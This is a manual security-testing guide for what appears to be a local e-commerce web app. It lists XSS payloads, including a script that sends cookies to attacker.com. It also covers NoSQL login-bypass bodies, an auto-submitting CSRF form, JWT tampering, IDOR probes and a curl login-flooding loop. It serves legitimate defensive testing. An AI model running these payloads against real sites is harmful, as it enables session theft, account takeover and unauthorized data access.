# Manual Security Testing Guide

## XSS Testing Payloads

### 1. Search Box XSS Tests
Test these payloads in the search functionality:

```javascript
// Basic XSS
<script>alert('XSS')</script>

// Image-based XSS
<img src=x onerror=alert('XSS')>

// Event handler XSS
<div onmouseover="alert('XSS')">test</div>

// SVG XSS
<svg onload=alert('XSS')>

// NoScript bypass
<noscript><p title="</noscript><img src=x onerror=alert('XSS')>">
```

### 2. Product Review XSS Tests
If there's a review system, test:

```javascript
// Persistent XSS in reviews
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>

// DOM-based XSS
<img src=x onerror="eval(atob('YWxlcnQoJ1hTUycp'))">
```

## NoSQL Injection Tests

### 1. Search Parameter Injection
Test URL parameters:

```
GET /api/products?search[$ne]=null
GET /api/products?search[$regex]=.*
GET /api/products?search[$where]=this.name.length>0
```

### 2. Login Bypass Tests
Test login endpoints:

```json
{
  "email": {"$ne": ""},
  "password": {"$ne": ""}
}

{
  "email": {"$regex": ".*"},
  "password": {"$regex": ".*"}
}
```

## CSRF Testing

### 1. Create Test HTML File
```html
<!DOCTYPE html>
<html>
<head><title>CSRF Test</title></head>
<body>
  <form action="http://localhost:5000/api/orders" method="POST">
    <input type="hidden" name="orderItems" value="[{\"product\":\"123\",\"qty\":1}]">
    <input type="hidden" name="shippingAddress" value="{}">
    <input type="hidden" name="paymentMethod" value="PayPal">
    <input type="submit" value="Submit">
  </form>
  <script>document.forms[0].submit();</script>
</body>
</html>
```

## JWT Security Tests

### 1. Token Manipulation
- Copy JWT token from browser dev tools
- Go to jwt.io and decode
- Modify payload (change user role, expiry)
- Test with modified token

### 2. Algorithm Confusion
- Change algorithm from RS256 to HS256
- Try "none" algorithm
- Test with empty signature

## Authorization Testing

### 1. Horizontal Privilege Escalation
- Login as User A
- Capture request to `/api/users/profile`
- Change user ID in URL to User B's ID
- Check if User B's data is returned

### 2. Vertical Privilege Escalation
- Login as regular user
- Try accessing admin endpoints:
  - `/api/admin/users`
  - `/api/admin/orders`
  - `/api/admin/products`

## API Security Tests

### 1. Rate Limiting Tests
```bash
# Test login endpoint flooding
for i in {1..100}; do
  curl -X POST http://localhost:5000/api/users/login \
    -H "Content-Type: application/json" \
    -d '{"email":"test@test.com","password":"wrongpass"}'
done
```

### 2. IDOR Testing
```
GET /api/orders/1  # Try different order IDs
GET /api/users/1   # Try different user IDs
GET /api/products/1 # Try different product IDs
```

## Security Headers Tests

### 1. Check Missing Headers
Look for these headers in responses:
- Content-Security-Policy
- X-Frame-Options
- X-XSS-Protection
- Strict-Transport-Security
- X-Content-Type-Options

### 2. Test Clickjacking
Create iframe test:
```html
<iframe src="http://localhost:3000" width="500" height="500"></iframe>
```

## File Upload Security (if applicable)

### 1. Malicious File Upload
- Try uploading .php, .jsp, .asp files
- Upload files with script tags in filename
- Test with large files (DoS)
- Upload files with null bytes

## Session Management Tests

### 1. Session Fixation
- Get session ID before login
- Login with credentials
- Check if session ID changed

### 2. Session Timeout
- Login and wait
- Test if session expires properly
- Check for session regeneration

---

## Testing Checklist

- [ ] XSS in search functionality
- [ ] XSS in user inputs (reviews, profile)
- [ ] NoSQL injection in search
- [ ] NoSQL injection in login
- [ ] CSRF protection missing
- [ ] JWT security issues
- [ ] Authorization bypass (IDOR)
- [ ] Rate limiting missing
- [ ] Security headers missing
- [ ] File upload vulnerabilities
- [ ] Session management issues